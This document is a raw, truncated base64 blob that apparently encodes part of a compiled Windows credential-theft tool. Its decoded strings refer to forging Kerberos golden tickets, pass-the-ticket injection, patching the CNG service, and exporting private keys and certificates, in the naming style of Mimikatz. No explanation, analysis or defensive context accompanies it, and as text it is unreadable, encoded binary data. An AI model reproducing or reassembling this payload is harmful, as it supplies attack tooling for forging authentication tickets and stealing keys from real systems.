QAgACAAIAAgACAAOgAgACUAcwAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBsAGkAcwB0ACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFIAZQB0AHIAaQBlAHYAZQBFAG4AYwBvAGQAZQBkAFQAaQBjAGsAZQB0AE0AZQBzAHMAYQBnAGUAIAAvACAAUABhAGMAawBhAGcAZQAgADoAIAAlADAAOAB4AAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGwAaQBzAHQAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUgBlAHQAcgBpAGUAdgBlAEUAbgBjAG8AZABlAGQAVABpAGMAawBlAHQATQBlAHMAcwBhAGcAZQAgADoAIAAlADAAOAB4AAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBsAGkAcwB0ACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFEAdQBlAHIAeQBUAGkAYwBrAGUAdABDAGEAYwBoAGUARQB4ADIATQBlAHMAcwBhAGcAZQAgAC8AIABQAGEAYwBrAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGwAaQBzAHQAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUQB1AGUAcgB5AFQAaQBjAGsAZQB0AEMAYQBjAGgAZQBFAHgAMgBNAGUAcwBzAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAACUAdQAtACUAMAA4AHgALQAlAHcAWgBAACUAdwBaAC0AJQB3AFoALgAlAHMAAAAAAHQAaQBjAGsAZQB0AC4AawBpAHIAYgBpAAAAAAAAAAAAdABpAGMAawBlAHQAAAAAAGEAZABtAGkAbgAAAAAAAABkAG8AbQBhAGkAbgAAAAAAcwBpAGQAAABkAGUAcwAAAHIAYwA0AAAAawByAGIAdABnAHQAAAAAAGEAZQBzADEAMgA4AAAAAABhAGUAcwAyADUANgAAAAAAdABhAHIAZwBlAHQAAAAAAGkAZAAAAAAAZwByAG8AdQBwAHMAAAAAADAAAAAAAAAAcwB0AGEAcgB0AG8AZgBmAHMAZQB0AAAANQAyADUANgAwADAAMAAAAGUAbgBkAGkAbgAAAAAAAAByAGUAbgBlAHcAbQBhAHgAAAAAAAAAAABVAHMAZQByACAAIAAgACAAIAAgADoAIAAlAHMACgBEAG8AbQBhAGkAbgAgACAAIAAgADoAIAAlAHMACgBTAEkARAAgACAAIAAgACAAIAAgADoAIAAlAHMACgBVAHMAZQByACAASQBkACAAIAAgADoAIAAlAHUACgAAAAAAAAAAAEcAcgBvAHUAcABzACAASQBkACAAOgAgACoAAAAAAAAAJQB1ACAAAAAKAFMAZQByAHYAaQBjAGUASwBlAHkAOgAgAAAAAAAAACAALQAgACUAcwAKAAAAAABTAGUAcgB2AGkAYwBlACAAIAAgADoAIAAlAHMACgAAAFQAYQByAGcAZQB0ACAAIAAgACAAOgAgACUAcwAKAAAATABpAGYAZQB0AGkAbQBlACAAIAA6ACAAAAAAAAAAAAAqACoAIABQAGEAcwBzACAAVABoAGUAIABUAGkAYwBrAGUAdAAgACoAKgAAAAAAAAAtAD4AIABUAGkAYwBrAGUAdAAgADoAIAAlAHMACgAKAAAAAAAAAAAACgBHAG8AbABkAGUAbgAgAHQAaQBjAGsAZQB0ACAAZgBvAHIAIAAnACUAcwAgAEAAIAAlAHMAJwAgAHMAdQBjAGMAZQBzAHMAZgB1AGwAbAB5ACAAcwB1AGIAbQBpAHQAdABlAGQAIABmAG8AcgAgAGMAdQByAHIAZQBuAHQAIABzAGUAcwBzAGkAbwBuAAoAAAAAAAAAAAAKAEYAaQBuAGEAbAAgAFQAaQBjAGsAZQB0ACAAUwBhAHYAZQBkACAAdABvACAAZgBpAGwAZQAgACEACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAAoAawB1AGwAbABfAG0AXwBmAGkAbABlAF8AdwByAGkAdABlAEQAYQB0AGEAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAASwByAGIAQwByAGUAZAAgAGUAcgByAG8AcgAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAASwByAGIAdABnAHQAIABrAGUAeQAgAHMAaQB6AGUAIABsAGUAbgBnAHQAaAAgAG0AdQBzAHQAIABiAGUAIAAlAHUAIAAoACUAdQAgAGIAeQB0AGUAcwApACAAZgBvAHIAIAAlAHMACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgAgADsAIABVAG4AYQBiAGwAZQAgAHQAbwAgAGwAbwBjAGEAdABlACAAQwByAHkAcAB0AG8AUwB5AHMAdABlAG0AIABmAG8AcgAgAEUAVABZAFAARQAgACUAdQAgACgAZQByAHIAbwByACAAMAB4ACUAMAA4AHgAKQAgAC0AIABBAEUAUwAgAG8AbgBsAHkAIABhAHYAYQBpAGwAYQBiAGwAZQAgAG8AbgAgAE4AVAA2AAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgAgADsAIABNAGkAcwBzAGkAbgBnACAAawByAGIAdABnAHQAIABrAGUAeQAgAGEAcgBnAHUAbQBlAG4AdAAgACgALwByAGMANAAgAG8AcgAgAC8AYQBlAHMAMQAyADgAIABvAHIAIAAvAGEAZQBzADIANQA2ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgAgADsAIABTAEkARAAgAHMAZQBlAG0AcwAgAGkAbgB2AGEAbABpAGQAIAAtACAAQwBvAG4AdgBlAHIAdABTAHQAcgBpAG4AZwBTAGkAZABUAG8AUwBpAGQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAE0AaQBzAHMAaQBuAGcAIABTAEkARAAgAGEAcgBnAHUAbQBlAG4AdAAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgAgADsAIABNAGkAcwBzAGkAbgBnACAAZABvAG0AYQBpAG4AIABhAHIAZwB1AG0AZQBuAHQACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAATQBpAHMAcwBpAG4AZwAgAHUAcwBlAHIAIABhAHIAZwB1AG0AZQBuAHQACgAAAAAAAAAgACoAIABQAEEAQwAgAGcAZQBuAGUAcgBhAHQAZQBkAAoAAAAAAAAAIAAqACAAUABBAEMAIABzAGkAZwBuAGUAZAAKAAAAAAAgACoAIABFAG4AYwBUAGkAYwBrAGUAdABQAGEAcgB0ACAAZwBlAG4AZQByAGEAdABlAGQACgAAACAAKgAgAEUAbgBjAFQAaQBjAGsAZQB0AFAAYQByAHQAIABlAG4AYwByAHkAcAB0AGUAZAAKAAAAIAAqACAASwByAGIAQwByAGUAZAAgAGcAZQBuAGUAcgBhAHQAZQBkAAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuAF8AZABhAHQAYQAgADsAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGUAbgBjAHIAeQBwAHQAIAAlADAAOAB4AAoAAAAAAAAAcABhAHMAcwB3AG8AcgBkAAAAAAAAAAAAYwBvAHUAbgB0AAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AaABhAHMAaAAgADsAIABIAGEAcwBoAFAAYQBzAHMAdwBvAHIAZAAgADoAIAAlADAAOAB4AAoAAAAAAAAAWAAtAEMAQQBDAEgARQBDAE8ATgBGADoAAAAAAAAAAAAKAFAAcgBpAG4AYwBpAHAAYQBsACAAOgAgAAAAAAAAAAoACgBEAGEAdABhACAAJQB1AAAAAAAAAAoACQAgACAAIAAqACAASQBuAGoAZQBjAHQAaQBuAGcAIAB0AGkAYwBrAGUAdAAgADoAIAAAAAAACgAJACAAIAAgACoAIABTAGEAdgBlAGQAIAB0AG8AIABmAGkAbABlACAAJQBzACAAIQAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGMAYwBhAGMAaABlAF8AZQBuAHUAbQAgADsAIABrAHUAbABsAF8AbQBfAGYAaQBsAGUAXwB3AHIAaQB0AGUARABhAHQAYQAgACgAMAB4ACUAMAA4AHgAKQAKAAAACgAJACoAIAAlAHcAWgAgAGUAbgB0AHIAeQA/ACAAKgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AYwBjAGEAYwBoAGUAXwBlAG4AdQBtACAAOwAgAGMAYwBhAGMAaABlACAAdgBlAHIAcwBpAG8AbgAgACEAPQAgADAAeAAwADUAMAA0AAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBjAGMAYQBjAGgAZQBfAGUAbgB1AG0AIAA7ACAAawB1AGwAbABfAG0AXwBmAGkAbABlAF8AcgBlAGEAZABEAGEAdABhACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBjAGMAYQBjAGgAZQBfAGUAbgB1AG0AIAA7ACAAQQB0ACAAbABlAGEAcwB0ACAAbwBuAGUAIABmAGkAbABlAG4AYQBtAGUAIABpAHMAIABuAGUAZQBkAGUAZAAKAAAAAAAAAAAAJ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gBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAIAAoAFAAcgBvAHQAbwB0AHkAcABlACkAAAAAAAAATQBTAF8ARQBOAEgAXwBSAFMAQQBfAEEARQBTAF8AUABSAE8AVgBfAFgAUAAAAAAAAAAAAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAEIAYQBzAGUAIABTAG0AYQByAHQAIABDAGEAcgBkACAAQwByAHkAcAB0AG8AIABQAHIAbwB2AGkAZABlAHIAAAAAAAAATQBTAF8AUwBDAEEAUgBEAF8AUABSAE8AVgAAAAAAAAAAAAAAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAARABIACAAUwBDAGgAYQBuAG4AZQBsACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAAAAAAAAAAAE0AUwBfAEQARQBGAF8ARABIAF8AUwBDAEgAQQBOAE4ARQBMAF8AUABSAE8AVgAAAE0AaQBjAHIAbwBzAG8AZgB0ACAARQBuAGgAYQBuAGMAZQBkACAARABTAFMAIABhAG4AZAAgAEQAaQBmAGYAaQBlAC0ASABlAGwAbABtAGEAbgAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAAAAAAAAAABNAFMAXwBFAE4ASABfAEQAUwBTAF8ARABIAF8AUABSAE8AVgAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAARABTAFMAIABhAG4AZAAgAEQAaQBmAGYAaQBlAC0ASABlAGwAbABtAGEAbgAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAAAAAAAAAABNAFMAXwBEAEUARgBfAEQAUwBTAF8ARABIAF8AUABSAE8AVgAAAAAAAAAAAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAEIAYQBzAGUAIABEAFMAUwAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAAAAAAAATQBTAF8ARABFAEYAXwBEAFMAUwBfAFAAUgBPAFYAAAAAAAAAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAAUgBTAEEAIABTAEMAaABhAG4AbgBlAGwAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAAAAAAAE0AUwBfAEQARQBGAF8AUgBTAEEAXwBTAEMASABBAE4ATgBFAEwAXwBQAFIATwBWAAAAAAAAAAAAAAAAAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAFIAUwBBACAAUwBpAGcAbgBhAHQAdQByAGUAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAAAABNAFMAXwBEAEUARgBfAFIAUwBBAF8AUwBJAEcAXwBQAFIATwBWAAAAAAAAAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAFMAdAByAG8AbgBnACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAAAE0AUwBfAFMAVABSAE8ATgBHAF8AUABSAE8AVgAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByACAAdgAxAC4AMAAAAAAATQBTAF8ARQBOAEgAQQBOAEMARQBEAF8AUABSAE8AVgAAAAAAAAAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAgAHYAMQAuADAAAAAAAE0AUwBfAEQARQBGAF8AUABSAE8AVgAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAFMARQBSAFYASQBDAEUAUwAAAAAAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8AVQBTAEUAUgBTAAAAAAAAAAAAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBDAFUAUgBSAEUATgBUAF8AUwBFAFIAVgBJAEMARQAAAAAAAAAAAAAAAAAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXwBFAE4AVABFAFIAUABSAEkAUwBFAAAAAAAAAAAAAAAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXwBHAFIATwBVAFAAXwBQAE8ATABJAEMAWQAAAAAAAAAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBfAEcAUgBPAFUAUABfAFAATwBMAEkAQwBZAAAAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8AQwBVAFIAUgBFAE4AVABfAFUAUwBFAFIAAAAAAAAAAAAAAAAAWwBlAHgAcABlAHIAaQBtAGUAbgB0AGEAbABdACAAUABhAHQAYwBoACAAQwBOAEcAIABzAGUAcgB2AGkAYwBlACAAZgBvAHIAIABlAGEAcwB5ACAAZQB4AHAAbwByAHQAAAAAAAAAAABjAG4AZwAAAFsAZQB4AHAAZQByAGkAbQBlAG4AdABhAGwAXQAgAFAAYQB0AGMAaAAgAEMAcgB5AHAAdABvAEEAUABJACAAbABhAHkAZQByACAAZgBvAHIAIABlAGEAcwB5ACAAZQB4AHAAbwByAHQAAAAAAAAAAABjAGEAcABpAAAAAAAAAAAATABpAHMAdAAgACgAbwByACAAZQB4AHAAbwByAHQAKQAgAGsAZQB5AHMAIABjAG8AbgB0AGEAaQBuAGUAcgBzAAAAAAAAAAAAawBlAHkAcwAAAAAAAAAAAEwAaQBzAHQAIAAoAG8AcgAgAGUAeABwAG8AcgB0ACkAIABjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAAAAAAAABjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAAAAAAAAAAAEwAaQBzAHQAIABjAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAcwB0AG8AcgBlAHMAAAAAAAAAcwB0AG8AcgBlAHMAAAAAAEwAaQBzAHQAIABjAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAcAByAG8AdgBpAGQAZQByAHMAAAAAAAAAAABwAHIAbwB2AGkAZABlAHIAcwAAAAAAAABDAHIAeQBwAHQAbwAgAE0AbwBkAHUAbABlAAAAAAAAAGMAcgB5AHAAdABvAAAAAAByAHMAYQBlAG4AaAAAAAAAQ1BFeHBvcnRLZXkAAAAAAG4AYwByAHkAcAB0AAAAAABOQ3J5cHRPcGVuU3RvcmFnZVByb3ZpZGVyAAAAAAAAAE5DcnlwdEVudW1LZXlzAABOQ3J5cHRPcGVuS2V5AAAATkNyeXB0RXhwb3J0S2V5AE5DcnlwdEdldFByb3BlcnR5AAAAAAAAAE5DcnlwdEZyZWVCdWZmZXIAAAAAAAAAAE5DcnlwdEZyZWVPYmplY3QAAAAAAAAAAEJDcnlwdEVudW1SZWdpc3RlcmVkUHJvdmlkZXJzAAAAQkNyeXB0RnJlZUJ1ZmZlcgAAAAAAAAAACgBDAHIAeQBwAHQAbwBBAFAASQAgAHAAcgBvAHYAaQBkAGUAcgBzACAAOgAKAAAAJQAyAHUALgAgACUAcwAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBwAHIAbwB2AGkAZABlAHIAcwAgADsAIABDAHIAeQBwAHQARQBuAHUAbQBQAHIAbwB2AGkAZABlAHIAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAKAEMATgBHACAAcAByAG8AdgBpAGQAZQByAHMAIAA6AAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAHAAcgBvAHYAaQBkAGUAcgBzACAAOwAgAEIAQwByAHkAcAB0AEUAbgB1AG0AUgBlAGcAaQBzAHQAZQByAGUAZABQAHIAbwB2AGkAZABlAHIAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAHMAeQBzAHQAZQBtAHMAdABvAHIAZQAAAEEAcwBrAGkAbgBnACAAZgBvAHIAIABTAHkAcwB0AGUAbQAgAFMAdABvAHIAZQAgACcAJQBzACcAIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBzAHQAbwByAGUAcwAgADsAIABDAGUAcgB0AEUAbgB1AG0AUwB5AHMAdABlAG0AUwB0AG8AcgBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAE0AeQAAAAAAAAAAAHMAdABvAHIAZQAAAAAAAAAAAAAAAAAAACAAKgAgAFMAeQBzAHQAZQBtACAAUwB0AG8AcgBlACAAIAA6ACAAJwAlAHMAJwAgACgAMAB4ACUAMAA4AHgAKQAKACAAKgAgAFMAdABvAHIAZQAgACAAIAAgACAAIAAgACAAIAA6ACAAJwAlAHMAJwAKAAoAAAAAACgAbgB1AGwAbAApAAAAAAAAAAAAAAAAAAkASwBlAHkAIABDAG8AbgB0AGEAaQBuAGUAcgAgACAAOgAgACUAcwAKAAkAUAByAG8AdgBpAGQAZQByACAAIAAgACAAIAAgACAAOgAgACUAcwAKAAAAAAAJAFQAeQBwAGUAIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAlAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAAOwAgAEMAcgB5AHAAdABHAGUAdABVAHMAZQByAEsAZQB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAawBlAHkAUwBwAGUAYwAgAD0APQAgAEMARQBSAFQAXwBOAEMAUgBZAFAAVABfAEsARQBZAF8AUwBQAEUAQwAgAHcAaQB0AGgAbwB1AHQAIABDAE4ARwAgAEgAYQBuAGQAbABlACAAPwAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwByAHkAcAB0AEEAYwBxAHUAaQByAGUAQwBlAHIAdABpAGYAaQBjAGEAdABlAFAAcgBpAHYAYQB0AGUASwBlAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgADsAIABDAGUAcgB0AEcAZQB0AEMAZQByAHQAaQBmAGkAYwBhAHQAZQBDAG8AbgB0AGUAeAB0AFAAcgBvAHAAZQByAHQAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAAOwAgAEMAZ